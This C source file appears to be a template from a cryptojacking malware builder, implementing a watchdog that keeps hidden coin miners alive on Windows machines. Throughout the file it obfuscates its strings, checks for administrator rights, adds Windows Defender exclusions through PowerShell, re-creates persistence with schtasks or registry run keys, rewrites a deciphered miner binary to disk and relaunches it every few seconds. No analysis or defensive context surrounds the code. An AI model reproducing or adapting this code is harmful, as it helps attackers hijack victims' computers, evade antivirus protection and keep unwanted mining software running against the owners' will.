#include "UFiles\ntddk.h"

#include "UFiles\common.h"
#include "UFiles\obfuscateu.h"

$GLOBALRESOURCES

int main(int argc, char *argv[])
{
    HANDLE hMutex;

    UNICODE_STRING umutex;
    init_unicode_string(&umutex, AYU_OBFUSCATEW(L"\\BaseNamedObjects\\#WATCHDOGID"), MAX_PATH);

    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);

    if (!NT_SUCCESS(UtCreateMutant(&hMutex, MUTANT_ALL_ACCESS, &attr, TRUE))) {
        return 0;
    }

    bool isAdmin = check_administrator();

    PUT_PEB_EXT peb = (PUT_PEB_EXT)SWU_GetPEB();
    wchar_t* pebenv = (wchar_t*)peb->ProcessParameters->Environment;

    wchar_t sysdir[MAX_PATH] = { 0 };
    combine_path(sysdir, get_env(pebenv, AYU_OBFUSCATEW(L"SYSTEMROOT=")), AYU_OBFUSCATEW(L"\\System32"));

    wchar_t cmdPath[MAX_PATH] = { 0 };
    combine_path(cmdPath, sysdir, AYU_OBFUSCATEW(L"\\cmd.exe"));

    wchar_t powershellPath[MAX_PATH] = { 0 };
    combine_path(powershellPath, sysdir, AYU_OBFUSCATEW(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));

    wchar_t startupPath[MAX_PATH] = { 0 };
    combine_path(startupPath, get_env(pebenv, AYU_OBFUSCATEW(L"$BASEDIR")), AYU_OBFUSCATEW(L"#STARTUPFILE"));

    wchar_t libPath[MAX_PATH] = { 0 };
    combine_path(libPath, get_env(pebenv, AYU_OBFUSCATEW(L"$CPPLIBSROOT")), AYU_OBFUSCATEW(L"\\Google\\Libs\\"));

    wchar_t regPath[MAX_PATH] = { 0 };
    combine_path(regPath, sysdir, AYU_OBFUSCATEW(L"\\reg.exe"));

    wchar_t schtasksPath[MAX_PATH] = { 0 };
    combine_path(schtasksPath, sysdir, AYU_OBFUSCATEW(L"\\schtasks.exe"));

    bool hasGPU = has_gpu();

    wchar_t* minerSet[][2] = { $WATCHDOGSET };

    ULONG fileSize;
    PVOID minerFile = read_file(startupPath, &fileSize);
    cipher((BYTE*)minerFile, fileSize);

    LARGE_INTEGER sleeptime;
    sleeptime.QuadPart = -(5000 * 10000);

    while (true) {
        UtDelayExecution(FALSE, &sleeptime);

        bool minerMissing = false;
        for (int i = 0; i < $MINERCOUNT; i++) {
            bool typeETH = !wcsicmp(AYU_OBFUSCATEW(L"eth"), minerSet[i][0]);
            if ((!typeETH || hasGPU) && !check_mutex(minerSet[i][1])) {
                minerMissing = true;
            }
        }

        bool fileMissing = !check_file_exists(startupPath);
        bool startupMissing = isAdmin ? !check_key_registry(AYU_OBFUSCATEW(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\#STARTUPENTRYNAME")) : false;
        if ((!check_mutex(AYU_OBFUSCATEW(L"\\BaseNamedObjects\\#MUTEXMINER")) && minerMissing) || fileMissing || startupMissing) {
#if DefWDExclusions
            run_program(true, sysdir, powershellPath, AYU_OBFUSCATEW(L"%S #WDCOMMAND"), powershellPath);
#endif
            if (isAdmin) {
                wchar_t tmpTaskTemplate[MAX_PATH] = { 0 };
                combine_path(tmpTaskTemplate, get_env(pebenv, AYU_OBFUSCATEW(L"TEMP=")), AYU_OBFUSCATEW(L"#TMPXML"));
                write_resource(resTaskTemplate, resTaskTemplateSize, tmpTaskTemplate, L"");
                run_program(true, sysdir, schtasksPath, AYU_OBFUSCATEW(L"%S #STARTUPADDADMIN"), schtasksPath, tmpTaskTemplate);
                delete_file(tmpTaskTemplate);
            }
            else {
                run_program(true, sysdir, regPath, AYU_OBFUSCATEW(L"%S #STARTUPADDUSER"), regPath, startupPath);
            }

            if (fileMissing) {
                cipher((BYTE*)minerFile, fileSize);
                write_file(startupPath, minerFile, fileSize);
                cipher((BYTE*)minerFile, fileSize);
            }

            if (isAdmin) {
                run_program(false, sysdir, schtasksPath, AYU_OBFUSCATEW(L"%S #STARTUPSTARTADMIN"), schtasksPath);
            }
            else {
                run_program(false, sysdir, startupPath, AYU_OBFUSCATEW(L"%S"), startupPath);
            }
        }
    }

    UtClose(hMutex);
	return 0;
} 